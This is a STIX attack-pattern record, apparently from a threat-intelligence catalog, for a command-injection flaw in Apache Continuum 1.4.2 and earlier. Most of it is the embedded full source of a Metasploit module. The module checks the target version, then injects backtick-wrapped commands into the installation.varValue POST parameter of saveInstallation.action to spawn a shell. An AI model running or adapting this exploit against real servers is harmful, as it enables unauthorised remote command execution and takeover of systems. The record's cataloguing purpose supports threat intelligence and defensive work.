{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5fcf5e4e-b113-42b9-bdfc-1acaa7e66ee5",
    "created": "2024-08-14T17:01:13.223383Z",
    "modified": "2024-08-14T17:01:13.223387Z",
    "name": "Apache Continuum Arbitrary Command Execution",
    "description": " This module exploits a command injection in Apache Continuum <= 1.4.2. By injecting a command into the installation.varValue POST parameter to /continuum/saveInstallation.action, a shell can be spawned. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_continuum_cmd_exec.rb",
            "external_id": "apache_continuum_cmd_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Continuum Arbitrary Command Execution',\n      'Description'    => %q{\n        This module exploits a command injection in Apache Continuum <= 1.4.2.\n        By injecting a command into the installation.varValue POST parameter to\n        /continuum/saveInstallation.action, a shell can be spawned.\n      },\n      'Author'         => [\n        'David Shanahan', # Proof of concept\n        'wvu'             # Metasploit module\n      ],\n      'References'     => [\n        %w{EDB 39886}\n      ],\n      'DisclosureDate' => '2016-04-06',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Privileged'     => false,\n      'Targets'        => [\n        ['Apache Continuum <= 1.4.2', {}]\n      ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([\n      Opt::RPORT(8080)\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/continuum/about.action'\n    )\n\n    if res && res.body.include?('1.4.2')\n      CheckCode::Appears\n    elsif res && res.code == 200\n      CheckCode::Detected\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status('Injecting CmdStager payload...')\n    execute_cmdstager\n  end\n\n  def execute_command(cmd, opts = {})\n    send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => '/continuum/saveInstallation.action',\n      'vars_post' => {\n        'installation.name'     => Rex::Text.rand_text_alpha(8),\n        'installation.type'     => 'jdk',\n        'installation.varValue' => '`' + cmd + '`'\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-04-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}